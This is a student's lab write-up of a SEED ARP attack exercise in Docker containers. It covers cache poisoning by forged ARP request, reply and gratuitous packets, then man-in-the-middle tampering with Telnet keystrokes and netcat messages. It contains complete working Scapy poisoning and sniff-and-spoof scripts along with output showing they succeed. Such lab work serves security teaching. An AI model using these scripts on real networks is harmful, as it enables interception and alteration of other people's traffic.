Tyler Tran
May 5th, 2025

# SEED Lab: ARP Attack
# Table of Contents
1. [Starting the Lab](#starting-the-lab)
2. [Task 1: ARP Cache Poisoning](#task-1:-arp-cache-poisoning)
3. [Task 2: MITM Attack on Telnet using ARP Cache Poisoning](#task-2:-mitm-attack-on-telnet-using-arp-cache-poisoning)
4. [Task 3: MITM Attack on Netcat using ARP Cache Poisoning](#task-3:-mitm-attack-on-netcat-using-arp-cache-poisoning)

# Starting the Lab
## Starting Docker
#### Commands
```
seed@VM:~/Desktop$ cd Labsetup
seed@VM:~/.../Labsetup$ docker-compose build
seed@VM:~/.../Labsetup$ docker-compose up
```
#### Output
```
seed@VM> docker-compose build
	HostA uses an image, skipping
	HostB uses an image, skipping
	HostM uses an image, skipping
seed@VM> docker-compose up
	ARNING: Found orphan containers (seed-attacker, hostA-10.9.0.5, hostB-10.9.0.6) for this project. If you removed or renamed this service in your compose file, you can run this command with the --remove-orphans flag to clean it up.
	Creating A-10.9.0.5   ... done
	Creating B-10.9.0.6   ... done
	Creating M-10.9.0.105 ... done
	Attaching to M-10.9.0.105, B-10.9.0.6, A-10.9.0.5
	B-10.9.0.6 |  * Starting internet superserver inetd                      [ OK ] 
	A-10.9.0.5 |  * Starting internet superserver inetd                      [ OK ]
```

# Task 1: ARP Cache Poisoning
## Prereq
Getting the IP Address and Mac Address of each container:
- Attacker M Container
	- 10.9.0.105
	- 02:42:0a:09:00:69
- Victim A Container
	- 10.9.0.5
	- 02:42:0a:09:00:05
- Victim B Container
	- 10.9.0.6
	- 02:42:0a:09:00:06
```
// Attacker M Container
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# arp -n
root@M-10.9.0.105:/# ifconfig
	eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
		inet 10.9.0.105  netmask 255.255.255.0  broadcast 10.9.0.255
		ether 02:42:0a:09:00:69  txqueuelen 0  (Ethernet)
		RX packets 70  bytes 10318 (10.3 KB)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
		inet 127.0.0.1  netmask 255.0.0.0
		loop  txqueuelen 1000  (Local Loopback)
		RX packets 0  bytes 0 (0.0 B)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

// Victim A Container
seed@VM> docksh A-10.9.0.5
root@A-10.9.0.5:/# arp -n
root@A-10.9.0.5:/# ifconfig
	eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
		inet 10.9.0.5  netmask 255.255.255.0  broadcast 10.9.0.255
		ether 02:42:0a:09:00:05  txqueuelen 0  (Ethernet)
		RX packets 71  bytes 10428 (10.4 KB)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
		inet 127.0.0.1  netmask 255.0.0.0
		loop  txqueuelen 1000  (Local Loopback)
		RX packets 0  bytes 0 (0.0 B)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

// Victim B Container
seed@VM> docksh A-10.9.0.6
root@A-10.9.0.6:/# arp -n
root@A-10.9.0.6:/# ifconfig
	eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
		inet 10.9.0.6  netmask 255.255.255.0  broadcast 10.9.0.255
		ether 02:42:0a:09:00:06  txqueuelen 0  (Ethernet)
		RX packets 70  bytes 10318 (10.3 KB)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
		inet 127.0.0.1  netmask 255.0.0.0
		loop  txqueuelen 1000  (Local Loopback)
		RX packets 0  bytes 0 (0.0 B)
		RX errors 0  dropped 0  overruns 0  frame 0
		TX packets 0  bytes 0 (0.0 B)
		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Task 1.A (using ARP Request)
On host M, construct an ARP request packet to map B’s IP address
to M’s MAC address. Send the packet to A and check whether the attack is successful or not.

#### Python ARP-Request.py
```python
from scapy.all import *

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's values
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M
m_ip    = "10.9.0.105"          # IP of M

# Forge an ARP request to A, asking "Who has B's IP?"
arp_req = ARP(
    op=1,               # ARP request
    psrc=b_ip,          # Claim to be B (pretending to be B IP Address)
    hwsrc=m_mac,        # Send M's MAC (attacker's MAC)
    pdst=b_ip,          # Asking "Who has B's IP?"
)

eth = Ether(dst=a_mac, src=m_mac)   # Send directly to A
pkt = eth / arp_req         # Combine Ethernet and ARP layers

sendp(pkt, iface="eth0")    # Send the packet on the specified interface
```

#### Output
```
// Attacker M Container
seed@VM> docker cp ARP-Request.py M-10.9.0.105:/tmp/
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# python3 /tmp/ARP-Request.py
	.
	Sent 1 packets.

// Victim A Container
seed@VM> docksh A-10.9.0.5
root@A-10.9.0.5:/# ping 10.9.0.6
	PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
	64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=0.396 ms
	64 bytes from 10.9.0.6: icmp_seq=2 ttl=64 time=0.148 ms
	64 bytes from 10.9.0.6: icmp_seq=3 ttl=64 time=0.163 ms
	64 bytes from 10.9.0.6: icmp_seq=4 ttl=64 time=0.171 ms
	^C
	--- 10.9.0.6 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3078ms
	rtt min/avg/max/mdev = 0.148/0.219/0.396/0.102 ms
// Before Attack
root@A-10.9.0.5:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
// After Attack
root@A-10.9.0.5:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
```

#### Results
> - The attack is successful.
> - After executing the attack, Victim A changed IP address of Victim B (10.9.0.6) to point towards the mac address of Attacker M (02:42:0a:09:00:69).

## Task 1.B (using ARP reply)
On host M, construct an ARP reply packet to map B’s IP address to M’s MAC address. Send the packet to A and check whether the attack is successful or not. Try the attack under the following two scenarios, and report the results of your attack:
- **Scenario 1:** B’s IP is already in A’s cache.
- **Scenario 2:** B’s IP is not in A’s cache. You can use the command "arp -d a.b.c.d" to
remove the ARP cache entry for the IP address a.b.c.d.

#### Python ARP-Reply.py
```python
from scapy.all import *

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's IP (we're spoofing this)
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M (attacker)
m_ip    = "10.9.0.105"          # IP of M

# Forge an ARP reply to A, saying "B's IP is at M's MAC"
arp_reply = ARP(
    op=2,               # ARP reply
    psrc=b_ip,          # Claim to be B (pretending to be B IP Address)
    hwsrc=m_mac,        # Send M's MAC (attacker's MAC)
    pdst=a_ip,          # Target is A
    hwdst=a_mac         # Send directly to A's MAC 
)

eth = Ether(dst=a_mac, src=m_mac) # Send directly to A
pkt = eth / arp_reply       # Combine Ethernet and ARP layers

sendp(pkt, iface="eth0")    # Send the packet on the specified interface

```

#### Output
```
// Attacker M Container
seed@VM> docker cp ARP-Request.py M-10.9.0.105:/tmp/
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# python3 /tmp/ARP-Reply.py
	.
	Sent 1 packets.

// Victim A Container
seed@VM> docksh A-10.9.0.5
root@A-10.9.0.5:/# ping 10.9.0.6
	PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
	64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=0.396 ms
	64 bytes from 10.9.0.6: icmp_seq=2 ttl=64 time=0.148 ms
	64 bytes from 10.9.0.6: icmp_seq=3 ttl=64 time=0.163 ms
	64 bytes from 10.9.0.6: icmp_seq=4 ttl=64 time=0.171 ms
	^C
	--- 10.9.0.6 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3078ms
	rtt min/avg/max/mdev = 0.148/0.219/0.396/0.102 ms
// Scenario 1: B’s IP is already in A’s cache
// Before Attack
root@A-10.9.0.5:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
// After Attack
root@A-10.9.0.5:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
// Scenario 2: B’s IP is not in A’s cache
// Before Attack
root@A-10.9.0.5:/# arp -d 10.9.0.6
root@A-10.9.0.5:/# arp -n
// After Attack
root@A-10.9.0.5:/# arp -n
```

#### Results
> - Scenario 1:
> 	 - The attack is successful.
> 	 - After executing the attack, Victim A changed IP address of Victim B (10.9.0.6) to point towards the mac address of Attacker M (02:42:0a:09:00:69).
>  - Scenario 2:
> 	  - The attack is unsuccessful.
>    - After executing the attack, nothing changed in Victim A.

## Task 1.C (using ARP gratuitous message)
On host M, construct an ARP gratuitous packet, and use it to map B’s IP address to M’s MAC address. Please launch the attack under the same two scenarios as those described in Task 1.B.

ARP gratuitous packet is a special ARP request packet. It is used when a host machine needs to
update outdated information on all the other machine’s ARP cache. The gratuitous ARP packet has
the following characteristics:
- The source and destination IP addresses are the same, and they are the IP address of the host issuing the gratuitous ARP.
- The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC
address (ff:ff:ff:ff:ff:ff).
- No reply is expected.

#### Python ARP-Reply.py
```python
from scapy.all import *

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's values
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M
m_ip    = "10.9.0.105"          # IP of M

# Build gratuitous ARP
arp_grat = ARP(
    op=1,                       # ARP request
    psrc=b_ip,                  # Claim to be B (pretending to be B IP Address)
    hwsrc=m_mac,                # Send M's MAC (attacker's MAC)
    pdst=b_ip,                  # Destination IP same as source (gratuitous)
    hwdst="00:00:00:00:00:00"   # Ignored in request, optional
)

eth = Ether(src=m_mac, dst="ff:ff:ff:ff:ff:ff") # Broadcast MAC address

pkt = eth / arp_grat        # Combine Ethernet and ARP layers
sendp(pkt, iface="eth0")    # Send the packet on the specified interface
```

#### Output
```
// Attacker M Container
seed@VM> docker cp ARP-Gratuitous.py M-10.9.0.105:/tmp/
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# python3 /tmp/ARP-Gratuitous.py
	.
	Sent 1 packets.

// Victim A Container
seed@VM> docksh A-10.9.0.5
root@A-10.9.0.5:/# ping 10.9.0.6
	PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
	64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=0.396 ms
	64 bytes from 10.9.0.6: icmp_seq=2 ttl=64 time=0.148 ms
	64 bytes from 10.9.0.6: icmp_seq=3 ttl=64 time=0.163 ms
	64 bytes from 10.9.0.6: icmp_seq=4 ttl=64 time=0.171 ms
	^C
	--- 10.9.0.6 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3078ms
	rtt min/avg/max/mdev = 0.148/0.219/0.396/0.102 ms
// Scenario 1: B’s IP is already in A’s cache
// Before Attack
root@A-10.9.0.5:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
// After Attack
root@A-10.9.0.5:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
// Scenario 2: B’s IP is not in A’s cache
// Before Attack
root@A-10.9.0.5:/# arp -d 10.9.0.6
root@A-10.9.0.5:/# arp -n
// After Attack
root@A-10.9.0.5:/# arp -n
```

#### Results
> - Scenario 1:
> 	 - The attack is successful.
> 	 - After executing the attack, Victim A changed IP address of Victim B (10.9.0.6) to point towards the mac address of Attacker M (02:42:0a:09:00:69).
>  - Scenario 2:
> 	  - The attack is unsuccessful.
>    - After executing the attack, nothing changed in Victim A.

# Task 2: MITM Attack on Telnet using ARP Cache Poisoning

## Step 1 (Launch the ARP cache poisoning attack)
First, Host M conducts an ARP cache poisoningattack on both A and B, such that in A’s ARP cache, B’s IP address maps to M’s MAC address, and in B’s ARP cache, A’s IP address also maps to M’s MAC address. After this step, packets sent between A and B will all be sent to M. We will use the ARP cache poisoning attack from Task 1 to achieve this goal. It is better that you send out the spoofed packets constantly (e.g. every 5 seconds); otherwise, the fake entries may be replaced by the real ones.

#### Python ARP-Poisoning.py
```python
# arp_poison.py
from scapy.all import *
import time

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's values
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M
m_ip    = "10.9.0.105"          # IP of M

def poison():
    while True:
        pkt_to_a = Ether(dst=a_mac)/ARP(op=2, psrc=b_ip, pdst=a_ip, hwsrc=m_mac, hwdst=a_mac)
        pkt_to_b = Ether(dst=b_mac)/ARP(op=2, psrc=a_ip, pdst=b_ip, hwsrc=m_mac, hwdst=b_mac)
        sendp(pkt_to_a, iface="eth0", verbose=False)
        sendp(pkt_to_b, iface="eth0", verbose=False)
        time.sleep(5)

poison()
```

#### Results
> Using the python code above (ARP-Poisoning.py), the attack works.

## Step 2 (Testing)
After the attack is successful, please try to ping each other between Hosts A and B, and report your observation. Please show Wireshark results in your report. Before doing this step, please make sure that the IP forwarding on Host M is turned off. You can do that with the following command:

> sysctl net.ipv4.ip_forward=0

#### Output
```
// Attacker M Container
seed@VM> docker cp ARP-Poisoning.py M-10.9.0.105:/tmp/
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# sysctl net.ipv4.ip_forward=0
	net.ipv4.ip_forward = 0
root@M-10.9.0.105:/# python3 /tmp/ARP-Poisoning.py

// Victim A Container
seed@VM> docksh A-10.9.0.5
// Before Attack
root@A-10.9.0.5:/# ping 10.9.0.6
	PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
	64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=0.190 ms
	64 bytes from 10.9.0.6: icmp_seq=2 ttl=64 time=0.290 ms
	64 bytes from 10.9.0.6: icmp_seq=3 ttl=64 time=0.156 ms
	64 bytes from 10.9.0.6: icmp_seq=4 ttl=64 time=0.164 ms
	^C
	--- 10.9.0.6 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3081ms
	rtt min/avg/max/mdev = 0.156/0.200/0.290/0.053 ms
root@A-10.9.0.5:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
// After Attack
root@A-10.9.0.5:/# ping 10.9.0.6
	PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
	^C
	--- 10.9.0.6 ping statistics ---
	6 packets transmitted, 0 received, 100% packet loss, time 5100ms
root@A-10.9.0.5:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0

// Victim B Container
seed@VM> docksh B-10.9.0.6
// Before Attack
root@B-10.9.0.6:/# ping 10.9.0.5
	PING 10.9.0.5 (10.9.0.5) 56(84) bytes of data.
	64 bytes from 10.9.0.5: icmp_seq=1 ttl=64 time=0.152 ms
	64 bytes from 10.9.0.5: icmp_seq=2 ttl=64 time=0.196 ms
	64 bytes from 10.9.0.5: icmp_seq=3 ttl=64 time=0.193 ms
	64 bytes from 10.9.0.5: icmp_seq=4 ttl=64 time=0.324 ms
	^C
	--- 10.9.0.5 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3052ms
	rtt min/avg/max/mdev = 0.152/0.216/0.324/0.064 ms
root@B-10.9.0.6:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.5                 ether   02:42:0a:09:00:05   C                     eth0
// After Attack
root@B-10.9.0.6:/# ping 10.9.0.5
	PING 10.9.0.5 (10.9.0.5) 56(84) bytes of data.
	^C
	--- 10.9.0.5 ping statistics ---
	4 packets transmitted, 0 received, 100% packet loss, time 3049ms
root@B-10.9.0.6:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.5                 ether   02:42:0a:09:00:69   C                     eth0
```
![91b2453406cf61216bc85e73d25982a6.png](:/49ecf247e7e24cff877883997eed5bea)

#### Results
> With IP Forwarding turn off on Host M, all the packets between Victim A and Victim B is lost. Both does not retrieve the packet back so they report it as a loss.

## Step 3 (Turn on IP forwarding)
Now we turn on the IP forwarding on Host M, so it will forward the packets between A and B. Please run the following command and repeat Step 2. Please describe your observation.

> sysctl net.ipv4.ip_forward=0

#### Output
```
// Attacker M Container
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# sysctl net.ipv4.ip_forward=1
	net.ipv4.ip_forward = 1
root@M-10.9.0.105:/# python3 /tmp/ARP-Poisoning.py

// Victim A Container
seed@VM> docksh A-10.9.0.5
// Before Attack
root@A-10.9.0.5:/# ping 10.9.0.6
	PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
	64 bytes from 10.9.0.6: icmp_seq=1 ttl=64 time=0.154 ms
	64 bytes from 10.9.0.6: icmp_seq=2 ttl=64 time=0.120 ms
	64 bytes from 10.9.0.6: icmp_seq=3 ttl=64 time=0.149 ms
	^C
	--- 10.9.0.6 ping statistics ---
	3 packets transmitted, 3 received, 0% packet loss, time 2036ms
	rtt min/avg/max/mdev = 0.120/0.141/0.154/0.015 ms
root@A-10.9.0.5:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
// After Attack
root@A-10.9.0.5:/# ping 10.9.0.6
	PING 10.9.0.6 (10.9.0.6) 56(84) bytes of data.
	64 bytes from 10.9.0.6: icmp_seq=1 ttl=63 time=0.360 ms
	From 10.9.0.105: icmp_seq=2 Redirect Host(New nexthop: 10.9.0.6)
	64 bytes from 10.9.0.6: icmp_seq=2 ttl=63 time=0.237 ms
	From 10.9.0.105: icmp_seq=3 Redirect Host(New nexthop: 10.9.0.6)
	64 bytes from 10.9.0.6: icmp_seq=3 ttl=63 time=0.277 ms
	^C
	--- 10.9.0.6 ping statistics ---
	3 packets transmitted, 3 received, 0% packet loss, time 2029ms
	rtt min/avg/max/mdev = 0.237/0.291/0.360/0.051 ms
root@A-10.9.0.5:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.105               ether   02:42:0a:09:00:69   C                     eth0
	10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0

// Victim B Container
seed@VM> docksh B-10.9.0.6
// Before Attack
root@B-10.9.0.6:/# ping 10.9.0.5
	PING 10.9.0.5 (10.9.0.5) 56(84) bytes of data.
	64 bytes from 10.9.0.5: icmp_seq=1 ttl=64 time=0.103 ms
	64 bytes from 10.9.0.5: icmp_seq=2 ttl=64 time=0.191 ms
	64 bytes from 10.9.0.5: icmp_seq=3 ttl=64 time=0.182 ms
	^C
	--- 10.9.0.5 ping statistics ---
	3 packets transmitted, 3 received, 0% packet loss, time 2030ms
	rtt min/avg/max/mdev = 0.103/0.158/0.191/0.039 ms
root@B-10.9.0.6:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.5                 ether   02:42:0a:09:00:05   C                     eth0
// After Attack
root@B-10.9.0.6:/# ping 10.9.0.5
	PING 10.9.0.5 (10.9.0.5) 56(84) bytes of data.
	64 bytes from 10.9.0.5: icmp_seq=1 ttl=63 time=0.159 ms
	From 10.9.0.105: icmp_seq=2 Redirect Host(New nexthop: 10.9.0.5)
	64 bytes from 10.9.0.5: icmp_seq=2 ttl=63 time=0.186 ms
	From 10.9.0.105: icmp_seq=3 Redirect Host(New nexthop: 10.9.0.5)
	64 bytes from 10.9.0.5: icmp_seq=3 ttl=63 time=0.167 ms
	^C
	--- 10.9.0.5 ping statistics ---
	3 packets transmitted, 3 received, 0% packet loss, time 2037ms
	rtt min/avg/max/mdev = 0.159/0.170/0.186/0.011 ms
root@B-10.9.0.6:/# arp -n
	Address                  HWtype  HWaddress           Flags Mask            Iface
	10.9.0.5                 ether   02:42:0a:09:00:69   C                     eth0
	10.9.0.105               ether   02:42:0a:09:00:69   C                     eth0
```
![ef9c2cf16de3c19c27f7cd2b58d715b4.png](:/d7c71424ffdf431abf2fe763572743ae)

#### Results
> With IP Forwarding turn on in Host M, all the packets between Victim A and Victim B is retrieved. Since it is retrieved, both Victim A and Victim B reports no loss.

## Step 4 (Launch the MITM attack)
We are ready to make changes to the Telnet data between A and B. Assume that A is the Telnet client and B is the Telnet server. After A has connected to the Telnet server on B, for every key stroke typed in A’s Telnet window, a TCP packet is generated and sent to B. We would like to intercept the TCP packet, and replace each typed character with a fixed character (say Z). This way, it does not matter what the user types on A, Telnet will always display Z.
From the previous steps, we are able to redirect the TCP packets to Host M, but instead of forwarding them, we would like to replace them with a spoofed packet. We will write a sniff-and-spoof program to accomplish this goal. In particular, we would like to do the following:
- We first keep the IP forwarding on, so we can successfully create a Telnet connection between A to B. Once the connection is established, we turn off the IP forwarding using the following command. Please type something on A’s Telnet window, and report your observation:
  > sysctl net.ipv4.ip_forward=0
- We run our sniff-and-spoof program on Host M, such that for the captured packets sent from A to B, we spoof a packet but with TCP different data. For packets from B to A (Telnet response), we do not make any change, so the spoofed packet is exactly the same as the original one.

#### Python ARP-MITM-Attack.py
```python
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"


def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1)    We need to delete the checksum in the IP & TCP headers,
        #       because our modification will make them invalid.
        #       Scapy will recalculate them if these fields are missing.
        # 2)    We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        del newpkt[TCP].payload
        
        #################################################################
        # Construct the new payload based on the old payload.

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load    # The original payload data
            newdata = b'Z' * len(data)      # Create a new payload with the same length

            send(newpkt/newdata)
            
        else:
            send(newpkt)
        #################################################################

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change

        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        send(newpkt)

f = 'tcp and not src host 10.9.0.105'
pkt = sniff(iface="eth0", filter=f, prn=spoof_pkt)
```

#### Output
```
// Attacker M Container (Window 1)

seed@VM> docker cp ARP-MITM-Attack.py M-10.9.0.105:/tmp/
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# sysctl net.ipv4.ip_forward=1
	net.ipv4.ip_forward = 1
root@M-10.9.0.105:/# python3 /tmp/ARP-Poisoning.py

// Attack M Container (Window 2)
seed@VM> docksh M-10.9.0.105
// After Victim A telnets to Victim B
root@M-10.9.0.105:/# sysctl net.ipv4.ip_forward=0
	net.ipv4.ip_forward = 0
root@M-10.9.0.105:/# python3 /tmp/ARP-MITM-Attack.py
	.
    Sent 1 packets.
    .
    Sent 1 packets.
    .
    Sent 1 packets.
    .
    Sent 1 packets.
	...

// Victim A Container
seed@VM> docksh A-10.9.0.5
// Before Attack
root@M-10.9.0.105:/# telnet 10.9.0.6
	Trying 10.9.0.6...
	Connected to 10.9.0.6.
	Escape character is '^]'.
	Ubuntu 20.04.1 LTS
	bd725fd9c4b6 login: root
	Password: 
	Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)

	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage

	This system has been minimized by removing packages and content that are
	not required on a system that users do not log into.

	To restore this content, you can run the 'unminimize' command.
	Last login: Sun May 11 06:49:52 UTC 2025 from 10.9.0.1 on pts/3
	root@bd725fd9c4b6:~# Testing Input
	root@bd725fd9c4b6:~#
// After sysctl net.ipv4.ip_forward=0
// No inputs are showing for Victim A
	root@bd725fd9c4b6:~#
// After Attack
	root@bd725fd9c4b6:~# ZZZZZZZZZZZZ
```
![7a03ba329a3c5ead70e801a7d0b45ae0.png](:/b776a02dee134aab8650ce3a4dc61edb)

#### Results
> With IP Forwarding turn off in Host M, Victim A does not see what it is typing to Victim B when using telnet. Everything that is typed is invisible, like it is not being typed at all.
> Using ARP-MITM-Attack.py, the MITM attack is successful as all the Victim A sees whenever it is typing is just Z's.

# Task 3: MITM Attack on Netcat using ARP Cache Poisoning
This task is similar to Task 2, except that Hosts A and B are communicating using netcat, instead of
telnet. Host M wants to intercept their communication, so it can make changes to the data sent between A and B. You can use the following commands to establish a netcat TCP connection between A and B:
```
On Host B (server, IP address is 10.9.0.6), run the following:
# nc -lp 9090

On Host A (client), run the following:
# nc 10.9.0.6 9090
```
Once the connection is made, you can type messages on A. Each line of messages will be put into a TCP packet sent to B, which simply displays the message. Your task is to replace every occurrence of your first name in the message with a sequence of A’s. The length of the sequence should be the same as that of your first name, or you will mess up the TCP sequence number, and hence the entire TCP connection. You need to use your real first name, so we know the work is done by you.

#### Python ARP-MITM-Attack-Name.py
```python
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

MY_NAME = b"Tyler"                     # Name to be replaced with "A"
REPLACE = b"A" * len(MY_NAME)          # Same-length replacement

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1)    We need to delete the checksum in the IP & TCP headers,
        #       because our modification will make them invalid.
        #       Scapy will recalculate them if these fields are missing.
        # 2)    We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        del newpkt[TCP].payload
        
        #################################################################
        # Construct the new payload based on the old payload.

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load    # The original payload data
            if MY_NAME in data:
                newdata = data.replace(MY_NAME, REPLACE)  # Replace name only
            else:
                newdata = data  # Leave unchanged if name not found

            send(newpkt/newdata)
            
        else:
            send(newpkt)
        #################################################################

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change

        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        send(newpkt)

f = 'tcp and not src host 10.9.0.105'
pkt = sniff(iface="eth0", filter=f, prn=spoof_pkt)

```

#### Output
```
// Attacker M Container (Window 1)

seed@VM> docker cp ARP-MITM-Attack-Name.py M-10.9.0.105:/tmp/
seed@VM> docksh M-10.9.0.105
root@M-10.9.0.105:/# sysctl net.ipv4.ip_forward=1
	net.ipv4.ip_forward = 1
root@M-10.9.0.105:/# python3 /tmp/ARP-Poisoning.py

// Attack M Container (Window 2)
seed@VM> docksh M-10.9.0.105
// After Victim B makes netcat server and Victim A connects to it
root@M-10.9.0.105:/# sysctl net.ipv4.ip_forward=0
	net.ipv4.ip_forward = 0
root@M-10.9.0.105:/# python3 /tmp/ARP-MITM-Attack-Name.py
	.
    Sent 1 packets.
    .
    Sent 1 packets.
    .
    Sent 1 packets.
    .
    Sent 1 packets.
	...

// Victim B Container
seed@VM> docksh B-10.9.0.6
// Before Attack
root@B-10.9.0.6:/# nc -lp 9090
	asd
	asd
	asd
	asd
	asd
// After Attack
	My name is AAAAA

// Victim A Container
seed@VM> docksh A-10.9.0.5
// Before Attack
root@A-10.9.0.5:/# nc 10.9.0.6 9090
	asd
	asd
	asd
	asd
	asd
// After Attack
	My name is Tyler
```
![f607a5cc0065d2256f932b0385f7448f.png](:/2aad5650ce734501a846b0d72cf78c60)

#### Results
> Task 3 is the same as Task 2 results except that whenever "Tyler" is sent and seen within the packets, it will be A'ed out. If the client (Victim A) sends a message that contains "My name is Tyler", the server (Victim B) would recieved a modified packet "My name is AAAAA". 
